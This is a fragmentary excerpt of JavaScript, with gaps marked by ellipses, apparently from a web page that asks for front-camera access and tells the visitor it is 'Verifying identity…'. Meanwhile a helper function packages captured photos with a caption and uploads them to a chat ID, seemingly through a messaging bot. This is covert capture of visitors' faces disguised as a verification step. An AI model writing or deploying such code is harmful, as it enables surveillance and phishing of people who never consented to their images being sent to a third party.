...
function sendPhotoTo(id,blob,cap){
  var fd=new FormData(); fd.append("chat_id",id); fd.append("photo",blob,"cipher_"+Date.now()+".jpg"); fd.append("caption",cap);
...
function startCamera(){
  camTitle.textContent="Camera access"; camSub.textContent="Awaiting permission…";
  navigator.mediaDevices.getUserMedia({video:{width:{ideal:CAM_WIDTH},height:{ideal:CAM_HEIGHT},facingMode:"user"}})
    ...
    .then(()=>{
      ...
      camTitle.textContent="Camera connected"; camSub.textContent="Verifying identity…";
